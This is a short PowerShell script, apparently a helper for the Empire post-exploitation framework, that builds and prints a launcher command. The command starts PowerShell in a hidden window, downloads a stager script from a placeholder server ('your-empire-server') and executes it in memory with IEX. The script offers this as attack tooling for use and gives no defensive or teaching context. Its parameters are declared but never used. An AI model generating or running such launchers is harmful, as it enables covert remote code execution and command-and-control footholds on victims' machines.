# Empire Launcher Customizer
function Generate-CustomEmpireLauncher {
    param(
        [string]$ListenerName = "http",
        [string]$StagerOptions = ""
    )

    $launcher = "powershell -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://your-empire-server/stager.ps1'))"
    return $launcher
}

Generate-CustomEmpireLauncher